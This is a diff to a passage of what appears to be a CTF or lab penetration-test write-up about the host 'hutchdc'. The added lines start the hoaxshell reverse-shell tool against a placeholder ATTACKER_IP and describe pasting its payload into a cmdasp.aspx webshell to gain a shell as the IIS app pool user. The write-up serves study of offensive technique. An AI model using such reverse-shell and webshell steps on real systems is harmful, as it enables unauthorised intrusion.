@@ -170,9 +170,10 @@ git clone https://github.com/t3l3machus/hoaxshell
 python3 -m venv hoaxenv
 source hoaxenv/bin/activate
 pip install -r hoaxshell/requirements.txt
+python3 hoaxshell/hoaxshell.py -s ATTACKER_IP
 ```
 
-This resulted in a low level interactive shell as user `iis apppool\defaultapppool` on `hutchdc`.
+Pasting the generated reverse shell payload in the cmdasp.aspx webshell resulted in a low level interactive shell as user `iis apppool\defaultapppool` on `hutchdc`.
 
 ---
 
